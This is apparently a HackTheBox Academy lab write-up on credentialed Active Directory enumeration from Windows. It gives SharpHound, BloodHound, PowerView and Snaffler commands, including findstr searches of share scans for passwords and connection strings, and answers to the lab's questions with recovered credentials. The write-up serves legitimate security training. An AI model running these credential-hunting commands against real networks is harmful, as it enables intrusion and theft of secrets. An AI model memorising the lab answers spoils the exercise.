```markdown
# Credentialed Enumeration - from Windows

## ℹ️ Informations

| Field | Value |
|-------|-------|
| 🌐 Platform | HackTheBox Academy |
| 📚 Module | Active Directory Enumeration & Attacks |
| 🔗 Section | [1421](https://academy.hackthebox.com/app/module/143/section/1421) |

***

## 🔑 Ключові команди

### SharpHound — збір даних для BloodHound
```powershell
cd C:\Tools
.\SharpHound.exe -c All --zipfilename bh_data.zip
```

### BloodHound — завантаження даних
```
1. Відкрий BloodHound
2. Upload Data (кнопка зі стрілкою вгору, права панель)
3. Вибери zip файл
4. Дочекайся імпорту
```

### BloodHound — знайти всі Kerberoastable акаунти
```
Analysis → List all Kerberoastable Accounts
```

### PowerView — перевірити адмін доступ до хоста
```powershell
Import-Module C:\Tools\PowerView.ps1
Test-AdminAccess -ComputerName <hostname>
```

### PowerView — enumerate користувачів
```powershell
Get-DomainUser | select samaccountname, description
```

### PowerView — enumerate груп
```powershell
Get-DomainGroup | select name, membercount
Get-DomainGroupMember -Identity "Interns"
```

### Snaffler — пошук чутливих файлів у shares
```powershell
cd C:\Tools
.\Snaffler.exe -s -d INLANEFREIGHT.LOCAL -o C:\Tools\snaffler_out.txt -v data
```

### Snaffler — фільтрація результатів
```powershell
type C:\Tools\snaffler_out.txt | findstr /i "connectionString"
type C:\Tools\snaffler_out.txt | findstr /i "password"
type C:\Tools\snaffler_out.txt | findstr /i "web.config"
```

***

## 🧪 Практика

### Середовище

| Параметр | Значення |
|----------|----------|
| Attack Host | `10.129.x.x` (ACADEMY-EA-ATTACK01) |
| RDP | `htb-student` / `Academy_student_AD!` |
| DC | `172.16.5.5` (ACADEMY-EA-DC01.INLANEFREIGHT.LOCAL) |

### Q1 — How many Kerberoastable accounts exist within the INLANEFREIGHT domain?

```powershell
# Крок 1 — Зібрати дані через SharpHound
cd C:\Tools
.\SharpHound.exe -c All --zipfilename bh_data.zip

# Крок 2 — Завантажити zip в BloodHound GUI
# Крок 3 — Analysis → List all Kerberoastable Accounts
# Підрахувати кількість вузлів на графіку
```

✅ **Відповідь: `13`**

***

### Q2 — What PowerView function allows us to test if a user has administrative access?

```powershell
Test-AdminAccess -ComputerName ACADEMY-EA-MS01
```

✅ **Відповідь: `Test-AdminAccess`**

***

### Q3 — Run Snaffler. What is the name of the user in the connection string?

```powershell
.\Snaffler.exe -s -d INLANEFREIGHT.LOCAL -o C:\Tools\snaffler_out.txt -v data
```

```
[File] {Red}<KeepConfigRegexRed|...|web.config>
nectionStrings>
  <add connectionString="server=ACADEMY-EA-DB01;database=Employees;uid=sa;password=ILFREIGHTDB01!;" />
</connectionStrings>
```

✅ **Відповідь: `sa`**

***

### Q4 — What is the password for the database user?

```
# З того самого web.config файлу знайденого Snaffler:
# password=ILFREIGHTDB01!
```

✅ **Відповідь: `ILFREIGHTDB01!`**
```
